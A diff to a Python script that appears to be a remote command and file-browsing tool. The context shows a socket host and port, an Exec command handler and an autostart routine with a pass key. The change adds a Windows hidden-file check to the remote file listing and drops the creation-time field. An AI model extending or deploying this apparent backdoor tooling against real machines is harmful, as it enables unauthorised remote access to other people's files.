@@ -5,6 +5,7 @@ import socket
 import time
 import os
 import subprocess
+import ctypes
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -53,6 +54,15 @@ def Exec(cmde):
     else:
         return "Enter a command.\n"
 
+def has_hidden_attribute(filepath):
+    try:
+        attrs = ctypes.windll.kernel32.GetFileAttributesW(unicode(filepath))
+        assert attrs != -1
+        result = bool(attrs & 2)
+    except (AttributeError, AssertionError):
+        result = False
+    return result
+
 def fromAutostart():
     global active
     global passKey
@@ -98,8 +108,8 @@ def fromAutostart():
                                 string[n]['name'] = i
                                 string[n]['type'] = os.path.isfile(i)
                                 string[n]['size'] = os.path.getsize(i)
-                                string[n]['created'] = time.ctime(os.path.getctime(i))
                                 string[n]['modified'] = time.ctime(os.path.getmtime(i))
+                                string[n]['hidden'] = has_hidden_attribute(i)
                             stdoutput = str(string)
                         except WindowsError:
                             stdoutput = 'Access is denied'
